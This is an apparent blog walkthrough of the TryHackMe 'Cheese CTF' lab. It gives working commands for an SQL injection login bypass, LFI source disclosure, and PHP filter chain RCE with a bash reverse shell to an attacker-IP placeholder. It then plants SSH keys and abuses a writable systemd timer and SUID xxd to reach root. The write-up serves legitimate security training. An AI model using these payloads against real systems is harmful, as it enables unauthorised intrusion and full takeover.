---
title: "TryHackMe Cheese CTF — Walkthrough"
date: 2025-12-16 11:30:00 +0300
categories: [TryHackMe, Web]
tags: [sqli, lfi, php-filters, ssh, systemd, suid, xxd]
pin: false
---

Cheese CTF chains **SQL injection** login bypass, **LFI** on `secret-script.php`, **PHP filter chain RCE**, writable **`authorized_keys`**, a broken **systemd timer**, and **SUID `xxd`** for root.

## Initial Enumeration

### Nmap scan

Full **nmap** is largely ineffective here due to **port spoofing** — skip exhaustive scanning.

### Web 80

A custom PHP application runs on port **80**.

## Shell as www-data

### Discovering LFI

`/login.php` presents a login form. SQLi bypass works with username:

```sql
' || 1=1;-- -
```

After login, redirect lands at:

```text
http://<TARGET_IP>/secret-script.php?file=supersecretadminpanel.html
```

The **`file`** parameter is the LFI sink. Other links also pass **PHP filter** wrappers in `file`.

`/secret-script.php` is also discoverable via fuzzing (`messages.html` links to it) and is reachable **without authentication**.

### Source disclosure via PHP filters

```bash
curl -s 'http://<TARGET_IP>/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d
```

The script **`include`s** the user-controlled `file` parameter directly.

### RCE with PHP filter chain

Generate a chain payload:

```bash
python3 php_filter_chain_generator.py --chain '<?php system("bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1\""); ?>' | grep '^php' > payload.txt
```

Trigger:

```bash
curl -s "http://<TARGET_IP>/secret-script.php?file=$(cat payload.txt)"
```

Catch shell on **443** as **`www-data`**.

```bash
www-data@cheesectf:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as comte

Writable files for **`www-data`**:

```bash
find / -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
```

Notable:

- `/home/comte/.ssh/authorized_keys`
- `/etc/systemd/system/exploit.timer`

Generate a key and append the public half:

```bash
ssh-keygen -f id_ed25519 -t ed25519
echo 'ssh-ed25519 AAAA... kali@kali' > /home/comte/.ssh/authorized_keys
```

SSH as **`comte`**:

```bash
ssh -i id_ed25519 comte@<TARGET_IP>
comte@cheesectf:~$ wc -c user.txt
4276 user.txt
```

## Shell as root

### sudo on systemd units

```bash
sudo -l
```

**`comte`** may run without password:

- `/bin/systemctl daemon-reload`
- `/bin/systemctl restart exploit.timer`
- `/bin/systemctl start exploit.timer`
- `/bin/systemctl enable exploit.timer`

**`exploit.timer`** — broken config:

```ini
[Timer]
OnBootSec=
```

**`exploit.service`** copies **`xxd`** to **`/opt/xxd`** and sets **SUID**:

```ini
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

Starting the timer fails until **`OnBootSec=`** is fixed. The timer file is **world-writable**:

```bash
ls -la /etc/systemd/system/exploit.timer
-rwxrwxrwx 1 root root 87 ...
```

Set **`OnBootSec=5s`**, then:

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start exploit.timer
```

Verify **`/opt/xxd`** is SUID.

Use GTFOBins **`xxd`** write primitive to plant root's SSH key:

```bash
echo 'ssh-ed25519 AAAA... kali@kali' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys
```

```bash
ssh -i id_ed25519 root@<TARGET_IP>
root@cheesectf:~# wc -c root.txt
321 root.txt
```

## Takeaways

- **`php://filter` chains** upgrade LFI to RCE without upload.
- Writable **`authorized_keys`** is immediate lateral movement.
- Broken **timers + writable unit files + SUID side effects** compose a full privesc chain.
